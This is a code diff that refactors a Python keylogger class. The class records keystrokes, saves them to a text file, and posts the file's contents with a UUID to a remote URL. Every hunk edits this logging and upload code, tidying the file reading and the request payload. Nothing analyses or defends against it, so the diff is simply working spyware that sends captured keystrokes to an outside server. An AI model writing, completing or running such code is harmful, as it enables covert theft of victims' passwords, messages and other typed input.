@@ -16,7 +16,6 @@ class Keylogger:
         self.start_dt = datetime.now()
         self.end_dt = datetime.now()
         self.url = url
-        self.filedata = ""
 
     def callback(self, event):
         name = event.name
@@ -50,25 +49,17 @@ class Keylogger:
         with open(f"{self.filename}.txt", "w") as f:
             # write the keylogs to the file
             print(self.log, file=f)
-        print(f"[+] Saved {self.filename}.txt")
+            print(f"[+] Saved {self.filename}.txt")
     
     def send_request(self):
-        f = open(f"{self.filename}.txt", "r")
-        self.filedata = f.read()
-        self.content = self.filedata.strip()
+        with open(f"{self.filename}.txt", "r") as f:
+            filedata = f.read()
+            self.content = filedata.strip()
 
-        self.reqdata = '''
-            {
-                "uuid": "%s",
-                "text-log": "%s"
-            }
-        ''' % (
-            self.uuid,
-            self.content
-        )
+        reqdata = {'uuid': str(self.uuid), 'logs': str(self.content)} 
 
-        r = requests.post(self.url, self.reqdata)
-        print(r.text,self.uuid)
+        r = requests.post(url=self.url, data=reqdata)
+        print(r.text)
 
     def report(self):
         if self.log:
